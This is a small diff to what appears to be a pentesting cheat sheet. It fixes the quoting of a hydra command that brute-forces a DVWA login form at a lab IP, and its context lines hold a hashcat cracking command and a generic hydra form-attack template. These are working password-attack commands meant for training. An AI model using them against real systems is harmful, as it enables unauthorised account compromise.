@@ -161,7 +161,7 @@ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
 Replace "ssh" with any service name
 
 hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Login failed"
-   Ejemplo: hydra -L /home/kali/Downloads/users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low; security=low:F=Username and/or password incorrect
+   Ejemplo: hydra -L /home/kali/Downloads/users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low; security=low:F=Username and/or password incorrect' 
 
 
 
